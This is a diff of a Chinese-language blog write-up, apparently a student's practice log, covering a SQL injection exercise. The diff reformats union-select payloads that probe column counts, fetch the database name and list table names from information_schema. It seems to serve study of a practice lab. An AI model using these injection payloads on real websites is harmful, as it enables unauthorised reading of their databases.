@@ -227,7 +227,8 @@
 <p>用php后端实现的文件上传</p>
 <hr>
 <h1 id="任务三——sql注入"><a href="#任务三——sql注入" class="headerlink" title="任务三——sql注入"></a>任务三——sql注入</h1><p>非常抱歉有那个懒病和拖延症，所以只完成最低要求的几个注入啦。（当然后续也许会继续“闯关”？</p>
-<p>?id&#x3D;null’ union select 1,2,3–+<br>?id&#x3D;null’ union select 1,2,,4–+</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=null<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">?id=null&#x27;</span> union <span class="keyword">select</span> 1,2,,4--+</span><br></pre></td></tr></table></figure>
+<p>发现只有两栏</p>
 <p>获取所有数据库名<br>?id&#x3D;null’ union select 1,database(),3–+</p>
 <p>获取所有表名</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure>
